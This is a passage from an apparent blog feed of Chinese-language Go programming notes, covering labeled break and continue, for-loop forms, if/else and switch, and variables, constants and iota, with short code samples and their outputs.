<p>　　<strong>特别注意：</strong> 使用标签和 <code>goto</code> 语句是不被鼓励的：它们会很快导致非常糟糕的程序设计，而且总有更加可读的替代方案来实现相同的需求。 如果必须使用 <code>goto</code>，应当只使用正序的标签（标签位于 <code>goto</code> 语句之后），但注意标签和 <code>goto</code> 语句之间不能出现定义新变量的语句，否则会导致编译失败。 </p>
<p>　　<code>break</code> 、 <code>continue</code> 也可以和 <code>LABEL</code> 结合来使用实现跳转到指定的目标层级：</p>
<p>　　<code>break</code> + <code>LABEL</code> 跳出外层循环，<code>break</code> 的跳转标签( <code>LABEL</code> )必须放在循环语句 <code>for</code> 前面，并且在<code>break</code> <code>LABEL</code> 跳出循环不再执行 <code>for</code> 循环里的代码：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">LABEL:</div><div class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</div><div class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">10</span>; j++ &#123;</div><div class="line">			<span class="keyword">if</span> j &gt; <span class="number">5</span> &#123;</div><div class="line">				<span class="keyword">break</span> LABEL</div><div class="line">			&#125;</div><div class="line">			fmt.Print(j)</div><div class="line">		&#125;</div><div class="line">		fmt.Println(<span class="string">""</span>)</div><div class="line">	&#125;</div><div class="line">	fmt.Println(<span class="string">"\nLABEL......"</span>)</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">012345</div><div class="line">LABEL......</div></pre></td></tr></table></figure>
<p>　　<code>break</code> + <code>LABEL</code> 实现跳出内层循环：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">LABEL:</div><div class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</div><div class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">8</span>; j++ &#123;</div><div class="line">			<span class="keyword">if</span> j &gt; <span class="number">4</span> &#123;</div><div class="line">				<span class="keyword">continue</span> LABEL</div><div class="line">			&#125;</div><div class="line">			fmt.Print(j)</div><div class="line">		&#125;</div><div class="line">		fmt.Println(<span class="string">""</span>)	<span class="comment">// LABEL在外层，该语句不会被执行</span></div><div class="line">	&#125;</div><div class="line">	fmt.Println(<span class="string">"\nLABEL......"</span>)</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">012340123401234</div><div class="line">LABEL......</div></pre></td></tr></table></figure>
<p>　　<code>continue</code> 的跳转标签( <code>LABEL</code> )也必须放在循环语句 <code>for</code> 前面，<code>continue</code> + <code>LABEL</code> 实现与 <code>break</code> 一样的功能：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</div><div class="line">    LABEL:</div><div class="line">    <span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">8</span>; j++ &#123;</div><div class="line">        <span class="keyword">if</span> j &gt; <span class="number">4</span> &#123;</div><div class="line">            <span class="keyword">continue</span> LABEL</div><div class="line">        &#125;</div><div class="line">        fmt.Print(j)</div><div class="line">    &#125;</div><div class="line">    fmt.Println(<span class="string">""</span>)	<span class="comment">// LABEL在这一层，该语句会执行</span></div><div class="line">&#125;</div><div class="line">fmt.Println(<span class="string">"\nLABEL......"</span>)</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">01234</div><div class="line">01234</div><div class="line">01234</div><div class="line"></div><div class="line">LABEL......</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-循环结构</title>
    <url>/2018/08/23/Golang%20%E7%AC%94%E8%AE%B0-%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<center> Golang 循环结构学习。</center>

<a id="more"></a>
<p>　　虽然 Go语言中没有 <code>while</code> 关键字，但是它的 <code>for</code> 语句更加灵活，可以实现其它语言中 <code>while</code> 和 <code>do while</code> 的功能。</p>
<h4 id="基于计数器的-for"><a href="#基于计数器的-for" class="headerlink" title="基于计数器的 for"></a>基于计数器的 for</h4><p>　　基本形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">for 初始化语句; 条件语句; 修饰语句 &#123;&#125;</div></pre></td></tr></table></figure>
<p>　　这三部分组成的循环的头部，它们之间使用分号<code>;</code> 相隔，但并不需要括号 <code>()</code> 将它们括起来。同样的，左花括号 <code>{</code> 必须和 <code>for</code> 语句在同一行，计数器的生命周期在遇到右花括号<code>}</code> 时便终止。</p>
<p>　　单层循环：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</div><div class="line">	fmt.Println(i)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　还可以在循环中同时使用多个计数器： </p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span> i, j := <span class="number">0</span>, <span class="number">3</span>; i &lt; j; i, j = i+<span class="number">1</span>, j<span class="number">-1</span> &#123;</div><div class="line">	fmt.Println(i, j)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　其中，<code>i, j = 0, 3</code> 是平行赋值操作。</p>
<p>　　多层（嵌套）循环：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</div><div class="line">    <span class="keyword">for</span> j := <span class="number">2</span>; j &gt; <span class="number">0</span>; j-- &#123;</div><div class="line">    	fmt.Println(i, j)</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="基于条件判断的-for"><a href="#基于条件判断的-for" class="headerlink" title="基于条件判断的 for"></a>基于条件判断的 for</h4><p>　　基于计数器的 <code>for</code> 也可以省略修饰语句，将其移到循环体内：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; &#123;</div><div class="line">   i++</div><div class="line">   fmt.Println(i)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　还可以把初始化语句提到循环体前，变成没有初始化语句和修饰语句的 for 结构，那么 <code>;;</code> 便可以省略：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> i = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> i &lt; <span class="number">3</span> &#123;</div><div class="line">	i = i + <span class="number">1</span></div><div class="line">	fmt.Println(i)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="无限循环"><a href="#无限循环" class="headerlink" title="无限循环"></a>无限循环</h4><p>　　如果 for 循环的头部没有条件语句，那么就会认为条件永远为 true，因此循环体内必须有相关的条件判断以确保会在某个时刻退出循环。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span> &#123;</div><div class="line">    <span class="comment">// 循环体</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　想要直接退出循环体，可以使用 break 语句或 return 语句直接返回 。但这两者之间有所区别，break 只是退出当前的循环体，而 return 语句提前对函数进行返回，不会执行后续的代码。</p>
<h4 id="for-range-结构"><a href="#for-range-结构" class="headerlink" title="for-range 结构"></a>for-range 结构</h4><p>　　Go 特有的一种的迭代结构， 可以迭代任何一个集合，包括 <code>array</code> 和 <code>map</code> 。例如，迭代 <code>array</code> ：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> 数组名&#123;	</div><div class="line">    <span class="comment">// 输出索引和值，i代表索引, v代表索引位置对应的值</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> 数组名&#123;</div><div class="line">    <span class="comment">// 仅输出值，不要使用索引时用下划线</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> array = [<span class="number">3</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</div><div class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> array &#123;</div><div class="line">	fmt.Println(i, v)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">0 1</div><div class="line">1 2</div><div class="line">2 3</div></pre></td></tr></table></figure>
<p>　　要注意的是，<strong>v 始终为集合中对应索引的值拷贝</strong>，因此它一般只具有只读性质，对它所做的任何修改都不会影响到集合中原有的值（如果 v 为指针，则会产生指针的拷贝，依旧可以修改集合中的原值）。</p>
<p>　　一个字符串是 Unicode 编码的字符（或称之为 <code>rune</code>）集合，因此您也可以用它迭代字符串：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> str = <span class="string">"abcd"</span></div><div class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> str &#123;</div><div class="line">	fmt.Printf(<span class="string">"%d, %c\n"</span>, i, v)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">0, a</div><div class="line">1, b</div><div class="line">2, c</div><div class="line">3, d</div></pre></td></tr></table></figure>
<p>　　每个 rune 字符和索引在 for-range 循环中是一一对应的。它能够自动根据 UTF-8 规则识别 Unicode 编码的字符。 </p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-分支结构</title>
    <url>/2018/08/22/Golang%20%E7%AC%94%E8%AE%B0-%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<center>Golang 分支结构学习。</center>

<a id="more"></a>
<h4 id="if-else"><a href="#if-else" class="headerlink" title="if-else"></a>if-else</h4><p>　　与其它语言的 <code>if-else</code> 没有什么区别。其中，条件语句不需要括号。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span> condition1 &#123;</div><div class="line">	<span class="comment">// do something	</span></div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> condition2 &#123;</div><div class="line">	<span class="comment">// do something else	</span></div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="comment">// catch-all or default</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　需要注意的是：</p>
<ul>
<li>即使当代码块之间只有一条语句时，大括号也不可被省略 </li>
<li><strong>关键字 if 和 else 之后的左大括号 <code>{</code> 必须和关键字在同一行</strong>，如果你使用了 <code>else-if</code> 结构，则前段代码块的右大括号 <code>}</code> 必须和 <code>else-if</code> 关键字在同一行。这两条规则都是被编译器强制规定的。</li>
<li>当条件比较复杂时，则可以使用括号让代码更易读。条件允许是符合条件，需使用 <code>&amp;&amp;、|| 或 !</code>，你可以使用括号来提升某个表达式的运算优先级，并提高代码的可读性。 </li>
</ul>
<p>　　<code>if</code> 可以包含一个初始化语句。这种写法具有固定的格式（在初始化语句后方必须加上分号）： </p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span> initialization; condition &#123;</div><div class="line">	<span class="comment">// do something</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　例如：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">val := <span class="number">10</span></div><div class="line"><span class="keyword">if</span> val &gt; max &#123;</div><div class="line">	<span class="comment">// do something</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">可以写为:</div><div class="line"></div><div class="line"><span class="keyword">if</span> val := <span class="number">10</span>; val &gt; max &#123;</div><div class="line">	<span class="comment">// do something</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　<strong>注意</strong>：使用简短方式 <code>:=</code>声明的变量的作用域只存在于 <code>if</code> 结构中（在 <code>if</code> 结构的大括号之间，如果使用 <code>if-else</code> 结构则在 <code>else</code> 代码块中变量也会存在）。如果变量在 <code>if</code> 结构之前就已经存在，那么在 <code>if</code> 结构中，该变量原来的值会被隐藏。最简单的解决方案就是不要在初始化语句中声明变量。</p>
<h4 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h4><p>　　相比较 C 和 Java 等其它语言而言，Go 语言中的 <code>switch</code> 结构使用上更加灵活。首先，<code>case</code> 中不需要<code>break</code> ，其次，它接受任意形式的表达式：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">switch</span> var1 &#123;</div><div class="line">	<span class="keyword">case</span> val1:</div><div class="line">		...</div><div class="line">	<span class="keyword">case</span> val2:</div><div class="line">		...</div><div class="line">	<span class="keyword">default</span>:</div><div class="line">		...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　变量 var1 可以是任何类型，而 val1 和 val2 则可以是同类型的任意值。类型不被局限于常量或整数，但必须是相同的类型；或者最终结果为相同类型的表达式。前花括号 { 必须和 <code>switch</code> 关键字在同一行。也可以同时测试多个可能符合条件的值，使用逗号分割它们，例如：<code>case val1, val2, val3</code>。</p>
<p>　　每一个 <code>case</code> 分支都是唯一的，从上至下逐一测试，直到匹配为止。一旦成功地匹配到某个分支，在执行完相应代码后就会退出整个 <code>switch</code> 代码块，也就是说您<strong>不需要特别使用 break 语句</strong>来表示结束。如果在执行完每个分支的代码后，还<strong>希望继续执行后续分支的代码，可以使用 fallthrough 关键字</strong>来达到目的。注意，相邻的空 <code>case</code> 块不构成多条件匹配。如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">switch</span> i &#123;</div><div class="line">	<span class="keyword">case</span> <span class="number">0</span>: <span class="comment">// 空分支，只有当 i == 0 时才会进入分支</span></div><div class="line">	<span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">		f() <span class="comment">// 当 i == 0 时函数不会被调用</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">switch</span> i &#123;</div><div class="line">	<span class="keyword">case</span> <span class="number">0</span>: <span class="keyword">fallthrough</span></div><div class="line">	<span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">		f() <span class="comment">// 当 i == 0 时函数也会被调用</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　<code>switch</code> 语句也可以不提供任何被判断的值（实际上默认为判断是否为 true），然后在每个 case 分支中进行测试不同的条件。当任一分支的测试结果为 true 时，该分支的代码会被执行。这看起来非常像链式的 `if-else 语句，但是在测试条件非常多的情况下，提供了可读性更好的书写方式。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">switch</span> &#123;</div><div class="line">	<span class="keyword">case</span> condition1:</div><div class="line">		...</div><div class="line">	<span class="keyword">case</span> condition2:</div><div class="line">		...</div><div class="line">	<span class="keyword">default</span>:</div><div class="line">		...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　<code>switch</code> 语句还包含一个初始化语句：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">switch</span> initialization &#123;</div><div class="line">	<span class="keyword">case</span> val1:</div><div class="line">		...</div><div class="line">	<span class="keyword">case</span> val2:</div><div class="line">		...</div><div class="line">	<span class="keyword">default</span>:</div><div class="line">		...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　与其他语言一样，用 <code>default</code> 可以指定当其他所有分支都不匹配的时候的行为。</p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-变量与常量</title>
    <url>/2018/08/22/Golang%20%E7%AC%94%E8%AE%B0-%E5%8F%98%E9%87%8F%E4%B8%8E%E5%B8%B8%E9%87%8F/</url>
    <content><![CDATA[<center>Golang 变量与常量学习。</center>

<a id="more"></a>
<h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><h5 id="声明与赋值"><a href="#声明与赋值" class="headerlink" title="声明与赋值"></a>声明与赋值</h5><p>　　Go 和许多编程语言不同，它在声明变量时将变量的类型放在变量的名称之后。一般形式是使用 <code>var</code> 关键字：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> identifier <span class="keyword">type</span></div></pre></td></tr></table></figure>
<p>　　示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> a <span class="keyword">int</span></div><div class="line"><span class="keyword">var</span> b <span class="keyword">bool</span></div><div class="line"><span class="keyword">var</span> str <span class="keyword">string</span></div></pre></td></tr></table></figure>
<p>　　也可以写成：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> (</div><div class="line">	a <span class="keyword">int</span></div><div class="line">	b <span class="keyword">bool</span></div><div class="line">	str <span class="keyword">string</span></div><div class="line">)</div></pre></td></tr></table></figure>
<p>　　这种因式分解关键字的写法一般用于声明全局变量。如果一个变量在函数体外声明，则被认为是<strong>全局变量</strong>，可以在整个包甚至外部包（被导出后）使用，不管你声明在哪个源文件里或在哪个源文件里调用该变量。在函数体内声明的变量称之为<strong>局部变量</strong>，它们的作用域只在函数体内，参数和返回值变量也是局部变量。</p>
<p>　　变量的命名规则遵循骆驼命名法，即首个单词小写，每个新单词的首字母大写。但如果你的全局变量希望能够被外部包所使用，则需要将首个单词的首字母也大写（前面的博客有介绍可见性规则）。</p>
<p>　　当一个变量被声明之后，系统自动赋予它该类型的零值：<code>int</code> 为 0，<code>float</code> 为 0.0，<code>bool</code> 为 <code>false</code>，<code>string</code> 为空字符串，指针为 <code>nil</code>。记住，所有的内存在 Go 中都是经过初始化的。</p>
<p>　　变量可以编译期间就被赋值，赋值给变量使用运算符等号 <code>=</code>，当然你也可以在运行时对变量进行赋值操作。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">a = <span class="number">15</span></div><div class="line">b = <span class="literal">true</span></div><div class="line">str = <span class="string">"hello"</span></div></pre></td></tr></table></figure>
<p>　　当然，和其它语言一样，也可以声明的同时赋值：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> a <span class="keyword">int</span> = <span class="number">15</span></div><div class="line"><span class="keyword">var</span> b <span class="keyword">bool</span> = <span class="literal">true</span></div><div class="line"><span class="keyword">var</span> str <span class="keyword">string</span> = <span class="string">"hello"</span></div></pre></td></tr></table></figure>
<p>　　不同的是，Go 语言可以根据变量的值来自动推断其类型，类似于Python。也就可以这样写：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> a = <span class="number">15</span></div><div class="line"><span class="keyword">var</span> b = <span class="literal">true</span></div><div class="line"><span class="keyword">var</span> str = <span class="string">"hello"</span></div></pre></td></tr></table></figure>
<p>　　但是，这样的写法有时候也不是万能的。比如，当你想要给变量的类型并不是自动推断出的某种类型时，你还是需要显式指定变量的类型：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> a <span class="keyword">int64</span> = <span class="number">15</span></div></pre></td></tr></table></figure>
<p>　　以上写法主要用于声明包级别的全局变量，当你在函数体内声明局部变量时，应使用简短声明语法 <code>:=</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">a := <span class="number">15</span></div></pre></td></tr></table></figure>
<p>　　在相同的代码块中，不可以再次对于相同名称的变量使用初始化声明。例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var a int</div><div class="line">a := 15	// 编译错误，重复初始化声明</div><div class="line">a = 15	// 正确</div></pre></td></tr></table></figure>
<p>　　如果声明了一个局部变量却没有在相同的代码块中使用它，同样会得到编译错误。而全局变量则允许声明后不使用。</p>
<p>　　同一类型的多个变量可以声明在同一行：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> x, y, z <span class="keyword">int</span></div></pre></td></tr></table></figure>
<p>　　多变量可以在同一行进行赋值（已经声明的前提下）：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">a, b, str = <span class="number">15</span>, <span class="literal">true</span>, <span class="string">"hello"</span></div></pre></td></tr></table></figure>
<p>　　也可以使用简短声明初始化：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">a, b, str := <span class="number">15</span>, <span class="literal">true</span>, <span class="string">"hello"</span></div></pre></td></tr></table></figure>
<p>　　要交换两个变量的值，可以按下面的方式写，这样省去了使用交换函数的必要：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">a, b = b, a</div></pre></td></tr></table></figure>
<h5 id="值类型和引用类型"><a href="#值类型和引用类型" class="headerlink" title="值类型和引用类型"></a>值类型和引用类型</h5><ul>
<li><strong>值类型</strong></li>
</ul>
<p>　　所有基本类型都属于值类型，使用这些类型的变量直接指向存在内存中的值。像数组和结构这些复合类型也是值类型。当使用等号 <code>=</code> 将一个变量的值赋值给另一个变量时，实际上是在内存中将值进行了拷贝。<strong>值类型的变量的值存储在栈中。</strong>可以通过取地址符号 <code>&amp;</code> 来获取变量的内存地址。</p>
<p>　　内存地址会根据机器的不同而有所不同，甚至相同的程序在不同的机器上执行后也会有不同的内存地址。因为每台机器可能有不同的存储器布局，并且位置分配也可能不同。</p>
<ul>
<li><strong>引用类型</strong></li>
</ul>
<p>　　在 Go 语言中，指针属于引用类型，其它的引用类型还有 <code>slices</code>，<code>maps</code> 和 <code>channel</code>。引用类型的变量存储的是变量的值所在的内存地址（数字），或内存地址中第一个字所在的位置。</p>
<p>　　同一个引用类型的指针指向的多个字可以是在连续的内存地址中（内存布局是连续的），这也是计算效率最高的一种存储形式；也可以将这些字分散存放在内存中，每个字都指示了下一个字所在的内存地址。<strong>当使用赋值语句时，只有引用（地址）被复制。</strong></p>
<p>　　如果引用类型变量的值被改变了，那么这个值的所有引用都会指向被修改后的内容。<strong>被引用的变量会存储在堆中，以便进行垃圾回收，且比栈拥有更大的内存空间。</strong></p>
<h5 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h5><p>　　Go中不存在隐式转换，所有类型转换必须显式声明，并且转换只能发生在两种相互兼容的类型之间。例如：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> ch <span class="keyword">byte</span> = <span class="number">97</span></div><div class="line"><span class="comment">//var a int = ch // 错误，不会隐式转换</span></div><div class="line"><span class="keyword">var</span> a <span class="keyword">int</span> = <span class="keyword">int</span>(ch)</div></pre></td></tr></table></figure>
<p>　　可以使用标准库中的方法实现整形到字符串的转换：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> i <span class="keyword">int</span> = <span class="number">1</span>  </div><div class="line"><span class="keyword">var</span> s <span class="keyword">string</span>  </div><div class="line">s = strconv.Itoa(i) 或者 s = FormatInt(<span class="keyword">int64</span>(i), <span class="number">10</span>)</div></pre></td></tr></table></figure>
<p>　　同样，字符串到整形：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> s <span class="keyword">string</span> = <span class="string">"1"</span>  </div><div class="line"><span class="keyword">var</span> i <span class="keyword">int</span>  </div><div class="line">i, err = strconv.Atoi(s) 或者 i, err = ParseInt(s, <span class="number">10</span>, <span class="number">0</span>)</div></pre></td></tr></table></figure>
<p>　　字符串到 <code>float32</code> 或 <code>float64</code> ：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> s <span class="keyword">string</span> = <span class="number">1</span>  </div><div class="line"><span class="keyword">var</span> f <span class="keyword">float32</span>  </div><div class="line">f, err = ParseFloat(s, <span class="number">32</span>)</div></pre></td></tr></table></figure>
<p>　　……等等，具体去查看标准库中相关的包。</p>
<h4 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h4><h5 id="声明与赋值-1"><a href="#声明与赋值-1" class="headerlink" title="声明与赋值　　"></a>声明与赋值　　</h5><p>　　常量使用关键字 <code>const</code> 定义，用于存储不会改变的数据。存储在常量中的数据类型只可以是布尔型、数字型（整数型、浮点型和复数）和字符串型。定义格式：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">const</span> identifier [<span class="keyword">type</span>] = value</div></pre></td></tr></table></figure>
<p>　　Go 语言中，可以省略类型说明符 <code>[type]</code>，因为编译器可以根据变量的值来推断其类型。一个没有指定类型的常量被使用时，会根据其使用环境而推断出它所需要具备的类型。换句话说，未定义类型的常量会在必要时刻根据上下文来获得相关类型。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">const</span> b <span class="keyword">string</span> = <span class="string">"abc"</span>	<span class="comment">// 显式类型定义</span></div><div class="line"><span class="keyword">const</span> b = <span class="string">"abc"</span>	<span class="comment">// 隐式类型定义</span></div></pre></td></tr></table></figure>
<p>　　常量的值必须是能够在编译时就能够确定的；你可以在其赋值表达式中涉及计算过程，但是所有用于计算的值必须在编译期间就能获得。<strong>因为在编译期间自定义函数均属于未知，因此无法用于常量的赋值，但内置函数可以使用，如：len()。</strong></p>
<p>　　常量也允许使用并行赋值的形式：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">const</span> a, b = <span class="number">1</span>, <span class="number">2</span></div></pre></td></tr></table></figure>
<p>　　在定义常量组时，如果不提供初始值，则表示将使用上行的表达式，即 <code>b</code> 的值也等于 1 。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">const</span>(</div><div class="line">	a = <span class="number">1</span></div><div class="line">	b</div><div class="line">)</div></pre></td></tr></table></figure>
<p>　　常量之所以为常量就是恒定不变的量，因此我们无法在程序运行过程中修改它的值；如果你在代码中试图修改常量的值则会引发编译错误。</p>
<h5 id="枚举类型"><a href="#枚举类型" class="headerlink" title="枚举类型"></a>枚举类型</h5><ul>
<li><strong>普通值枚举类型</strong></li>
</ul>
<p>　　Go 语言中，没有直接支持枚举的关键字，也就造成 Go 没有直接枚举的功能，但是可以使用 <code>const</code>  后跟一对圆括号的方式定义一组常量实现定义普通枚举类型。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">const</span> (</div><div class="line">	English = <span class="number">0</span></div><div class="line">	Chinese = <span class="number">1</span></div><div class="line">	Math = <span class="number">2</span></div><div class="line">)</div></pre></td></tr></table></figure>
<ul>
<li><strong>自增值枚举类型</strong></li>
</ul>
<p>　　也可以使用 <code>const</code> 和 <code>iota</code> 的方式来定义自增值枚举类型。常量生成器 <code>iota</code> 常量声明中，<code>iota</code> 从 0 开始取值 。在每一个 <code>const</code> 关键字出现时，被重置为 0 ，然后再下一个 <code>const</code> 出现之前，每出现一次 <code>iota</code> ，其所代表的数字会自动增加 1。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">const</span> a = <span class="literal">iota</span>	<span class="comment">// a=0 </span></div><div class="line"><span class="keyword">const</span> ( </div><div class="line">  b = <span class="literal">iota</span>	<span class="comment">//b=0 </span></div><div class="line">  c			<span class="comment">//c=1 </span></div><div class="line">)</div></pre></td></tr></table></figure>
<p>　　定义数量级的例子：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">const</span> (</div><div class="line">    b = <span class="number">1</span> &lt;&lt; (<span class="number">10</span> * <span class="literal">iota</span>)</div><div class="line">    kb</div><div class="line">    mb</div><div class="line">    gb</div><div class="line">    tb</div><div class="line">    pb</div><div class="line">)</div><div class="line">fmt.Println(b, kb, mb, gb, tb, pb)</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">1 1024 1048576 1073741824 1099511627776 1125899906842624</div></pre></td></tr></table></figure>
<p>　　如果 <code>iota</code>  中间出现插队的情况，那么后续的值会使用插队的值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">const (</div><div class="line">    b = 1 &lt;&lt; (10 * iota)</div><div class="line">    kb</div><div class="line">    mb = 1000</div><div class="line">    gb</div><div class="line">    tb</div><div class="line">    pb</div><div class="line">)</div><div class="line">fmt.Println(b, kb, mb, gb, tb, pb)</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">1 1024 1000 1000 1000 1000</div></pre></td></tr></table></figure>
<p>　　再次通过 <code>iota</code> 来重新开始使用 <code>iota</code> 的计数作为枚举值：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">const</span> (</div><div class="line">    b = <span class="number">1</span> &lt;&lt; (<span class="number">10</span> * <span class="literal">iota</span>)</div><div class="line">    kb</div><div class="line">    mb = <span class="number">1000</span></div><div class="line">    gb	</div><div class="line">    tb = <span class="literal">iota</span></div><div class="line">    pb</div><div class="line">)</div><div class="line">fmt.Println(b, kb, mb, gb, tb, pb)</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">1 1024 1000 1000 4 5</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-数据类型与运算符</title>
